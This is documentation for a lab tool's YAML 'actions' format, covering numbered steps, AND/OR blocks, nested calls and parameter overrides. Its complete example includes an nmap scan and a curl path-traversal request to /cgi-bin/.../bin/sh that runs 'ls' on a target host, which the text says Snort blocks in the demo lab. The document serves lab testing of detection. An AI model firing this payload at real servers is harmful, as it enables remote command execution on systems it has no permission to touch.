# Actions

## Overview

Actions define reusable command sequences executed on lab machines using the CLI `action` command.

Actions are defined inside an `actions.yaml` file and MUST use enumerated steps.

Each step is explicitly numbered (1, 2, 3, …). Nested steps can use alphanumeric identifiers (1a, 1b, …).

---

## Required Structure

An action must follow this structure:

```yaml
actions:
  action_name:
    1:
      ...
    2:
      ...
    3:
      ...
```

Steps are executed in numeric order.

You must enumerate them.

---

## Supported Step Formats

Each numbered step can be defined in one of the following ways.

---

### Command + Expected (Dictionary Format)

```yaml
1:
  command: echo 'OK'
  expected: OK
```

---

### Tuple Format

You can define a command using a tuple-like YAML list:

```yaml
1: ["echo 'test'", test]
```

Format:

```yaml
<step_number>: ["<command>", <expected_output>]
```

---

### Compound Command (AND / OR)

You can combine multiple sub-steps using logical operators.

```yaml
2:
  operator: AND
  2a:
    command: nmap -sV 192.168.2.10 | fgrep 'Apache' | awk '/open/'
    expected: Apache
  2b: ["echo 'test kali'", "test kali"]
```

Supported operators:

- `AND` → all sub-steps must succeed
- `OR` → at least one sub-step must succeed

Sub-steps must also be enumerated.

---

### Call Another Action

An action can call another action as a numbered step:

```yaml
2:
  call: testping
```

Optional expected result (defaults to `Success):

```yaml
2:
  call: testping
  expected: Fail
```

---

## Parameters

Commands support inline parameters using this syntax:

```
<$KEY:DEFAULT>
```

Example:

```yaml
1:
  command: "ping -c 3 <$IP:192.168.2.10>"
  expected: "3 received"
```

If no override is provided, the default value is used.

---

## Overriding Parameters from CLI

Parameters can be overridden at execution time:

```
action <machine> <action_name> $KEY=value
```

Example:

```
action kali test $IP=10.10.1.1
```

Multiple overrides are supported:

```
action kali test $IP=10.0.0.5 $PORT=8080
```

---

## Complete Example

```yaml
actions:

  test:
    1:
      call: testping
      #expected: Success
    2:
      operator: AND
      1a:
        command: nmap -sV 192.168.2.10 | fgrep 'Apache' | awk '/open/'
        expected: Apache
      1b: [echo 'test kali', test kali]
    3:
      [curl 'http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;ls', bash]
    4:
      command: echo 'OK'
      expected: OK

  testping:
    1:
      command: ping -c 3 <$IP:192.168.2.10>
      expected: 3 received
    2: 
      command: echo 'test'
      expected: test
```

### Explanation

**1**: Calls another action named `testping`. Its expected result is `"Success"` by default unless overridden.  
**2**: Executes a compound AND operation:
  * **2a**: Runs an `nmap` scan to detect Apache on `192.168.2.10`.
  * **2b**: Runs a simple `echo` command and verifies output.

**3**: Executes a `curl` command to trigger a path traversal, effectively executing `ls`.  
**4**: Runs a simple `echo 'OK'` command to confirm the final step.

#### Note
If you execute this action in the demo lab, it will stop at step 3 because Snort will detect the path traversal and block the attack.

---

## Execution

Run an action with:

```
action <machine> <action_name>
```

Or override parameters:

```
action <machine> <action_name> $KEY=value
```

---

### Execution Rules

* Steps are executed **sequentially** in numeric order.

* If a command step fails or its output does not match the expected string, the action stops immediately and is marked as Fail

* For **call steps**:

  - If `expected` is `Success` (default), the called action must succeed; otherwise the parent action fails

  - If `expected` is `Fail`, the called action is expected to fail, and this does **not** halt the parent action

* For **compound steps** with operators:

  - `AND` → all sub-steps must succeed; failure halts the action unless a sub-step is expected to fail

  - `OR` → at least one sub-step must succeed; failure continues to the next sub-step if possible

**Notes:**

* Command steps compare **expected strings** with the actual output

* Call steps use **Success/Fail semantics**, not string matching

## Summary

Rules:

- Steps MUST be enumerated
- Each step can be:
  - command + expected
  - tuple `[command, expected]`
  - compound block with `operator`
  - `call` to another action
- Parameters are defined inline using `<$KEY:DEFAULT>`
- Parameters can be overridden from CLI


